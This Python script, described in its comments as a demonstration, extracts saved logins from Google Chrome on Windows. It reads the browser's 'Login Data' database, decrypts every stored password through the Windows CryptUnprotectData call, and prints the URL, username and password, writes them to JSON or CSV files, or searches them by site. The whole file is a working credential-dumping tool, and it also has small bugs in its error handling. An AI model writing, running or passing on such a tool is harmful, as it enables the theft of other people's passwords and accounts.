import os
import sys
import json
import csv
import argparse
import sqlite3
import win32crypt

#python program meant to show how to extract passwords from browser as well as show use of databases built stored in the browsers

def valPath(): #gets the file path for the chrome information
    if os.name =="nt": # this is a windows system
        path= (os.getenv("localappdata")+'\\Google\\Chrome\\User Data\\Default\\')
        if not(os.path.isdir(path)):
            print('couldnt find chrome path windows!')
            sys.exit(0)
    print('found path on windows!')
    return path

def recover():#main function that uses all the other parts to recover passwords, allows user to search by name, print out info, return info to the user as a json or txt file
    parser = argparse.ArgumentParser(description="Retrieve Google Chrome Passwords")
    parser.add_argument("-p", "--print", help="Dump passwords to stdout. ", action="store_true")
    parser.add_argument("-o", "--out", choices=['json','txt'],help="Output passwords to JSON or txt format.")
    parser.add_argument("-s", "--search", help="returns info of searched object, input something like a site name")



    args = parser.parse_args()

    if args.print:
        for line in SQLextractor():
            print('========================================================')
            print(line)
            print()
    elif args.out=='json':
        jsonExtract(SQLextractor())
    elif args.out=='txt':
        csvExtract(SQLextractor())
    elif args.search:
        items = search(SQLextractor(),str(args.search))
        if items!=[]:
            for i in items:
                print(i)
                print()
        else:
            print('nothing found matching that search, sorry')
    return

# gets name for file created
def nameget():
    name=input('name you want to give the file: ')
    return name

# get search results
def search(info,name):
    found =[]
    for i in info:
        if(name in i['url']):
            found.append(i)
    return found
    

def jsonExtract( info): # extracts json data
    try:
        name =nameget()
        with open(name+'.json', 'w') as json_file:
            json.dump({'password_items': info}, json_file)
        print('success, info wriiten to '+name)
    except EnvironmentError:
        print("could not write the data")
#extracts as csv
def csvExtract(info):
    try:
        name =nameget()
        with open(name, 'wb') as csv_file:
            csv_file.write('origin_url,username,password \n'.encode('utf-8'))
            for data in info:
                csv_file.write(('%s, %s, %s \n' % (data['url'], data[
                    'user'], data['password'])).encode('utf-8'))
        print('success, info wriiten to '+name)
    except EnvironmentError:
        print('could not write data')

# where the actaul parsing of information from the database takes place
def SQLextractor():
    info=[]
    path=valPath()
    try:
        connect = sqlite3.connect(path+'Login Data')
        print('connected')
        with connect:
            cursor = connect.cursor()
            rawData = cursor.execute(
                'SELECT action_url, username_value, password_value FROM logins')
            d = rawData.fetchall()# unencrypted data
            for i in d:
                if os.name =='nt':
                    password = win32crypt.CryptUnprotectData(i[2], None, None, None, 0)[1]
                    if password:
                        info.append({'url':i[0],'user':i[1],'password':str(password)})
    except sqlite3.operationalError as err:
        print(str(e))
    def alphabet(ele):
        return ele['url']
    info =sorted(info, key=alphabet)
    return info
#------------------------------------------
if __name__ == '__main__':
    recover()
